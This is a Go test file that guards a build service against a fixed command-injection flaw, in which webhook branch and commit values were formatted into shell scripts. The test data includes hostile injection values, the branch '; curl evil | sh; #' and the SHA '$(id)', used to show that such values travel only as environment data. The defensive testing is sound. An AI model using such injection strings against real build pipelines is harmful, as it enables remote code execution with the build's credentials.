package services

import (
	"os"
	"strings"
	"testing"
)

// The production failure: build scripts were assembled with fmt.Sprintf from the branch and
// commit SHA, which arrive in the body of an unauthenticated webhook. A branch named
// "; curl evil | sh; #" executed in the build pod with the build's credentials mounted.
//
// The scripts are consts now, so Go itself stops them carrying a formatted value. What can
// still regress is the call site going back to building a script from the request, so that
// is what this checks -- by reading the source, the way mfa_test.go asserts its reauth
// guards are still called.
func TestBuildJobUsesTheConstantScripts(t *testing.T) {
	src, err := os.ReadFile("builder.go")
	if err != nil {
		t.Skipf("cannot read builder.go: %v", err)
	}
	body := string(src)

	// Referenced by name, however the call site is spelled. Pinning one phrasing made this
	// fail when nixpacks moved into an init container -- the constant was still the only
	// thing passed, which is the property that matters.
	for _, want := range []string{"nixpacksScript", "buildpacksScript"} {
		if !strings.Contains(body, want) {
			t.Errorf("builder.go no longer references %q -- if the script is being assembled "+
				"again, the branch and commit SHA from the webhook are back in shell context", want)
		}
	}

	// The property itself: no script is built by formatting. A const passed straight in
	// cannot carry a value from the request; a Sprintf next to one of these names can.
	for _, name := range []string{"nixpacksScript", "buildpacksScript", "cloneScript"} {
		for _, bad := range []string{"fmt.Sprintf(" + name, name + " + fmt.Sprintf", name + " +  fmt.Sprintf"} {
			if strings.Contains(body, bad) {
				t.Errorf("builder.go contains %q; the script is being assembled from the request", bad)
			}
		}
	}

	// The clone used to be built here. Any reappearance of a git URL under Sprintf means
	// the host or the credential is being interpolated again.
	for _, forbidden := range []string{`fmt.Sprintf("https://x-access-token`, `git clone`} {
		if strings.Contains(body, forbidden) {
			t.Errorf("builder.go contains %q; the clone belongs in the constant script", forbidden)
		}
	}
}

// A value that reaches the script must reach it as data. If any of these appeared as a
// literal it would mean the script was built from the request again.
func TestBuildScriptsDoNotContainRequestValues(t *testing.T) {
	req := BuildRequest{
		Repository: "acme/web",
		Host:       "gitlab.internal",
		Branch:     "; curl evil | sh; #",
		CommitSHA:  "$(id)",
		ImageDest:  "registry.example.com/acme/web:abc12345",
	}

	env := buildScriptEnv(req)
	byName := map[string]string{}
	for _, e := range env {
		byName[e.Name] = e.Value
	}

	for _, want := range scriptEnvNames {
		if _, ok := byName[want]; !ok {
			t.Errorf("the scripts read %s but buildScriptEnv does not set it; "+
				"under `set -eu` an unset variable aborts the build", want)
		}
	}

	// The hostile values must be carried as env values, never as script text.
	if byName["GIT_BRANCH"] != req.Branch {
		t.Errorf("GIT_BRANCH = %q, want the branch verbatim", byName["GIT_BRANCH"])
	}
	for _, script := range []string{nixpacksScript, buildpacksScript} {
		for _, hostile := range []string{req.Branch, req.CommitSHA, req.Repository, req.ImageDest, req.Host} {
			if strings.Contains(script, hostile) {
				t.Errorf("script contains the request value %q as literal text", hostile)
			}
		}
	}
}

// Every variable the script references must either be supplied by buildScriptEnv or be one
// of the two that come from the git secret. A reference to anything else aborts the build
// under `set -eu`, or silently expands to nothing where it is guarded.
func TestScriptsReferenceOnlyKnownVariables(t *testing.T) {
	allowed := map[string]bool{
		// Set from the git secret as secretKeyRef entries.
		"GIT_TOKEN": true, "GIT_USERNAME": true,
		// Defined inside the script itself.
		"CRED_FILE": true, "GIT_C": true, "CLONE_URL": true,
	}
	for _, n := range scriptEnvNames {
		allowed[n] = true
	}

	for name, script := range map[string]string{
		"nixpacks":   nixpacksScript,
		"buildpacks": buildpacksScript,
	} {
		t.Run(name, func(t *testing.T) {
			for _, ref := range shellVarRefs(script) {
				if !allowed[ref] {
					t.Errorf("script references $%s, which nothing sets", ref)
				}
			}
		})
	}
}

// The token must not end up in argv. It used to be expanded into the clone URL, which put a
// live credential where anything able to read /proc in the pod could see it.
func TestTokenNeverReachesTheCloneURL(t *testing.T) {
	for name, script := range map[string]string{
		"nixpacks":   nixpacksScript,
		"buildpacks": buildpacksScript,
	} {
		t.Run(name, func(t *testing.T) {
			for _, line := range strings.Split(script, "\n") {
				if !strings.Contains(line, "CLONE_URL=") {
					continue
				}
				if strings.Contains(line, "GIT_TOKEN") || strings.Contains(line, "GIT_USERNAME") {
					t.Errorf("the clone URL is built with credentials in it: %q", strings.TrimSpace(line))
				}
			}
		})
	}
}

// shellVarRefs pulls out ${NAME} and $NAME references, ignoring the printf format string.
func shellVarRefs(script string) []string {
	var out []string
	seen := map[string]bool{}

	for i := 0; i < len(script); i++ {
		if script[i] != '$' || i+1 >= len(script) {
			continue
		}
		j := i + 1
		if script[j] == '{' {
			j++
		}
		start := j
		for j < len(script) && (isWordByte(script[j])) {
			j++
		}
		name := script[start:j]
		if name != "" && !seen[name] {
			seen[name] = true
			out = append(out, name)
		}
		i = j - 1
	}
	return out
}

func isWordByte(b byte) bool {
	return b == '_' || (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || (b >= '0' && b <= '9')
}
